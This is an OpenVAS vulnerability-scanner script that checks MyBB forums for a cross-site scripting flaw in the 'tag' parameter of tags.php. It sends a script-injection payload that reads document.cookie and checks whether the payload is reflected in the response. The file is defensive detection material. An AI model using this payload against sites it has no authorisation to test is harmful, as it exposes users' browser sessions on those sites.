###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_mybb_tag_param_xss_vuln.nasl 11997 2018-10-20 11:59:41Z mmartin $
#
# MyBB 'tags.php' Cross Site Scripting Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = 'cpe:/a:mybb:mybb';

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.902804");
  script_version("$Revision: 11997 $");
  script_bugtraq_id(45388);
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:N/A:N");
  script_tag(name:"last_modification", value:"$Date: 2018-10-20 13:59:41 +0200 (Sat, 20 Oct 2018) $");
  script_tag(name:"creation_date", value:"2011-12-27 15:15:15 +0530 (Tue, 27 Dec 2011)");
  script_name("MyBB 'tags.php' Cross Site Scripting Vulnerability");

  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Web application abuses");
  script_dependencies("sw_mybb_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("MyBB/installed");

  script_tag(name:"impact", value:"Successful exploitation will allow remote attackers to insert
  arbitrary HTML and script code, which will be executed in a user's browser
  session in the context of an affected site.");
  script_tag(name:"affected", value:"MyBB versions 1.6.5 and prior.");
  script_tag(name:"insight", value:"The flaw is due to improper validation of user-supplied input
  via the 'tag' parameter in 'tags.php', which allows attackers to execute
  arbitrary HTML and script code in a user's browser session in the context
  of an affected site.");
  script_tag(name:"solution", value:"No known solution was made available for at least one year since the disclosure
  of this vulnerability. Likely none will be provided anymore. General solution options are to upgrade to a newer
  release, disable respective features, remove the product or replace the product by another one.");
  script_tag(name:"summary", value:"The host is running MyBB and is prone to cross site scripting
  vulnerability.");

  script_xref(name:"URL", value:"http://www.securityfocus.com/bid/45388");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/64148");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/108156/mybb165-xss.txt");
  script_xref(name:"URL", value:"http://packetstormsecurity.org/files/view/96658/mybbtag-xss.txt");

  script_tag(name:"solution_type", value:"WillNotFix");

  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
if( ! dir = get_app_location( cpe:CPE, port:port ) ) exit( 0 );

if (dir == "/") dir = "";

url = dir + '/tags.php?tag="><script>alert(document.cookie)</script>';

if(http_vuln_check(port:port, url:url, check_header: TRUE,
                   pattern:"><script>alert\(document.cookie\)</script>"))
{
  security_message(port:port);
  exit(0);
}

exit(99);
